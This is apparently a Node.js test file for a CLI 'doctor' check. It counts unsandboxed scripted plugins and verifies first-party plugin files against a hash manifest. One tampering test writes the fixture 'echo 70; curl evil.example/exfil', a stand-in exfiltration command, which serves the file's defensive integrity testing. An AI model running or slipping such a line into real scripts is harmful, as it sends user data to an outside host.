// Tests for `opencues doctor`'s F9 sandbox-status helper (INFOSEC F9).
//
// Pins the unwrapped-by-default footgun visibility: when scripted
// blanks are installed without `sandbox: strict`, doctor must count
// them so users see the exposure.

'use strict';

const { test, before, after } = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

const crypto = require('node:crypto');

const { _internal } = require('./doctor.cjs');
const { scanScriptedBlanks, isShippedIntact } = _internal;

let tmpHome;

before(() => {
  tmpHome = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-doctor-scan-'));
});

after(() => {
  try { fs.rmSync(tmpHome, { recursive: true, force: true }); } catch {}
});

function writeBlank(name, frontmatter) {
  const dir = path.join(tmpHome, '.cues', 'blanks', name);
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'BLANK.md'), `---\n${frontmatter}\n---\n\n# ${name}\n`);
}

test('F9: counts scripted blanks with sandbox: strict separately from unconfined', () => {
  writeBlank('volume', 'name: volume\nblankScript: ./vol.sh\nsandbox: strict');
  writeBlank('brightness', 'name: brightness\nblankScript: ./b.sh');
  writeBlank('weather', 'name: weather'); // not scripted — should be ignored
  writeBlank('risky', 'name: risky\nblankScript: ./r.sh\nsandbox: off');
  const r = scanScriptedBlanks(tmpHome);
  assert.strictEqual(r.total, 3, 'should count 3 scripted blanks (volume, brightness, risky)');
  assert.strictEqual(r.strict, 1, 'only volume has sandbox: strict');
  assert.deepStrictEqual(r.unstrictPaths.sort(), ['brightness', 'risky']);
});

test('F9: no scripted blanks → zero totals', () => {
  const emptyHome = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-doctor-empty-'));
  try {
    const r = scanScriptedBlanks(emptyHome);
    assert.strictEqual(r.total, 0);
    assert.strictEqual(r.strict, 0);
    assert.deepStrictEqual(r.unstrictPaths, []);
  } finally {
    fs.rmSync(emptyHome, { recursive: true, force: true });
  }
});

test('F9: ignores BLANK.md files without `blankScript:` (built-in TS blanks)', () => {
  const tsHome = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-doctor-ts-'));
  try {
    const dir = path.join(tsHome, '.cues', 'blanks', 'answer');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'BLANK.md'), '---\nname: answer\nimpl: AnswerBlank\n---\n');
    const r = scanScriptedBlanks(tsHome);
    assert.strictEqual(r.total, 0, 'built-in TS blank should not be counted as scripted');
  } finally {
    fs.rmSync(tsHome, { recursive: true, force: true });
  }
});

test('F9: malformed frontmatter is silently skipped (best-effort)', () => {
  const wonkyHome = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-doctor-wonky-'));
  try {
    const dir = path.join(wonkyHome, '.cues', 'blanks', 'broken');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'BLANK.md'), 'no frontmatter here at all');
    const r = scanScriptedBlanks(wonkyHome);
    assert.strictEqual(r.total, 0);
  } finally {
    fs.rmSync(wonkyHome, { recursive: true, force: true });
  }
});

// ── Shipped-manifest exemption (hash-based trust for first-party blanks) ──
// Volume + brightness can't run under `sandbox: strict` (they need
// xrandr / VolCtl.exe / nircmd.exe — outside any sandbox). To stop
// the doctor warning from drowning out genuinely risky user-installed
// blanks, the F9 scan reads `packages/opencues-core/dist/shipped-
// manifest.json` and exempts a blank when every file in its folder
// hash-matches what we shipped. Tests below exercise the predicate
// in isolation — no dependence on the actual shipped manifest.

function sha256(content) {
  return crypto.createHash('sha256').update(content).digest('hex');
}

test('shipped-intact: matching hashes return true', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-shipped-intact-'));
  try {
    const dir = path.join(tmp, 'volume');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'BLANK.md'), 'frontmatter');
    fs.writeFileSync(path.join(dir, 'volume-blank.sh'), 'echo 70');
    const manifest = {
      volume: {
        'BLANK.md': sha256('frontmatter'),
        'volume-blank.sh': sha256('echo 70'),
      },
    };
    assert.strictEqual(isShippedIntact('volume', dir, manifest), true);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

test('shipped-intact: one byte modified → false (spoof / user edit)', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-shipped-spoof-'));
  try {
    const dir = path.join(tmp, 'volume');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'BLANK.md'), 'frontmatter');
    // Spoofed content — hash won't match what we shipped.
    fs.writeFileSync(path.join(dir, 'volume-blank.sh'), 'echo 70; curl evil.example/exfil');
    const manifest = {
      volume: {
        'BLANK.md': sha256('frontmatter'),
        'volume-blank.sh': sha256('echo 70'),
      },
    };
    assert.strictEqual(isShippedIntact('volume', dir, manifest), false);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

test('shipped-intact: extra file in user dir → false (larger surface than shipped)', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-shipped-extra-'));
  try {
    const dir = path.join(tmp, 'volume');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'BLANK.md'), 'frontmatter');
    fs.writeFileSync(path.join(dir, 'volume-blank.sh'), 'echo 70');
    fs.writeFileSync(path.join(dir, 'extra-helper.sh'), 'echo unexpected');
    const manifest = {
      volume: {
        'BLANK.md': sha256('frontmatter'),
        'volume-blank.sh': sha256('echo 70'),
      },
    };
    assert.strictEqual(isShippedIntact('volume', dir, manifest), false);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

test('shipped-intact: blank name not in manifest → false (e.g. user-defined pack)', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-shipped-unknown-'));
  try {
    const dir = path.join(tmp, 'my-custom-blank');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'BLANK.md'), 'whatever');
    const manifest = { volume: { 'BLANK.md': sha256('whatever') } };
    assert.strictEqual(isShippedIntact('my-custom-blank', dir, manifest), false);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

test('shipped-intact: missing manifest → false (safe default — warn rather than exempt)', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-shipped-nomanifest-'));
  try {
    const dir = path.join(tmp, 'volume');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'BLANK.md'), 'frontmatter');
    assert.strictEqual(isShippedIntact('volume', dir, null), false);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

test('shipped-intact: .exe in user dir is ignored (compiled artefact, excluded from manifest)', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-shipped-exe-'));
  try {
    const dir = path.join(tmp, 'volume');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'BLANK.md'), 'frontmatter');
    fs.writeFileSync(path.join(dir, 'volume-blank.sh'), 'echo 70');
    fs.writeFileSync(path.join(dir, 'VolCtl.cs'), 'class VolCtl {}');
    // Freshly-compiled artefact; not in manifest by design.
    fs.writeFileSync(path.join(dir, 'VolCtl.exe'), 'PE\x00\x00binary');
    const manifest = {
      volume: {
        'BLANK.md': sha256('frontmatter'),
        'volume-blank.sh': sha256('echo 70'),
        'VolCtl.cs': sha256('class VolCtl {}'),
      },
    };
    assert.strictEqual(isShippedIntact('volume', dir, manifest), true);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});
